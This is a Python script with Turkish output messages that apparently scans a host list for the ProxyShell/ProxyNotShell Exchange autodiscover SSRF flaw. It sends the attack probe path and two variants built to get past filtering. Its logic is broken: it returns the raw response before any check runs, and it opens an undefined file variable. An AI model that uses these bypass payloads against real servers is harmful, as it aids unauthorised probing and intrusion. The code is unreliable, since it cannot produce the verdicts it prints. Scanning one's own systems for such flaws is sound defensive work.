#python3
#Originated from : https://github.com/CronUp/Vulnerabilidades/blob/main/proxynotshell_checker.nse
#Author: Laronax

from tkinter import E
import requests
import argparse

def scanner(host):
    tpayload = "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
    payload = "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
    payload_bypass1 = "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell"
    payload_bypass2 = "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'}
    yakalandik=False
    try:
        res=requests.get(host+payload,headers=headers,allow_redirects=False,timeout=10)
        return(res)
    except requests.exceptions.ReadTimeout as er:
        yakalandik=True
    except requests.exceptions.ConnectionError as er:
        yakalandik=True
    if (yakalandik== False) and res.status_code==302 and (res.headers.get('x-feserver')!=None):
        return("ProxyShell ve ProxyNotShell Zafiyet olabilir: "+ host)
    elif (yakalandik== False) and  res.status_code!=302 and (res.headers.get('x-feserver')!=None):
        return("ProxyNotShell Zafiyet olabilir: "+ host)
    elif (yakalandik== False) and (res.status_code == 401): 
        return "Not Vulnerable (resource requires basic authentication)."
    elif (yakalandik== False) and (res.status_code == 404): 
        return "Not Vulnerable (affected resource not found)."
    elif (yakalandik== False) and (res.status_code == 403): 
        return "Not Vulnerable (access to resource is blocked)."
    elif (yakalandik== False) and (res.status_code == 500): 
        return "Not Vulnerable (internal server error)."
    if yakalandik:
        yakalandik=False
        payload=payload_bypass1
        try:
            res=requests.get(host+payload,headers=headers,allow_redirects=False,timeout=10)
            return(res)
        except requests.exceptions.ReadTimeout as er:
            yakalandik=True
        except requests.exceptions.ConnectionError as er:
            yakalandik=True
        if (yakalandik== False) and res.status_code==302 and (res.headers.get('x-feserver')!=None):
            return("ProxyShell ve ProxyNotShell Zafiyet olabilir: "+ host)
        elif (yakalandik== False) and res.status_code!=302 and (res.headers.get('x-feserver')!=None):
            return("ProxyNotShell Zafiyet olabilir: "+ host)
        if yakalandik:
            yakalandik=False
            payload=payload_bypass2
            try:
                res=requests.get(host+payload,headers=headers,allow_redirects=False,timeout=10)
                return(res)
            except requests.exceptions.ReadTimeout as er:
                yakalandik=True
            except requests.exceptions.ConnectionError as er:
                yakalandik=True
            if (yakalandik== False) and res.status_code==302 and (res.headers.get('x-feserver')!=None):
                return("ProxyShell ve ProxyNotShell Zafiyet olabilir: "+ host)
            elif (yakalandik== False) and res.status_code!=302 and (res.headers.get('x-feserver')!=None):
                return("ProxyNotShell Zafiyet olabilir: "+ host)
            elif yakalandik==True :
                return("Zafiyet yok!: "+host)
        if yakalandik:
            return("Zafiyet yok veya engelleniyoruz")
    

parse = argparse.ArgumentParser()
parse.add_argument('-l', '--listfile', help="Host listesi olarak kullanılır: 'https://subdomain' formatında olmalıdır")
args=parse.parse_args()
f_location=args.listfile
f=open(f)
hosts=f.readlines()
f.close()

for host in hosts:
    print(scanner(host))
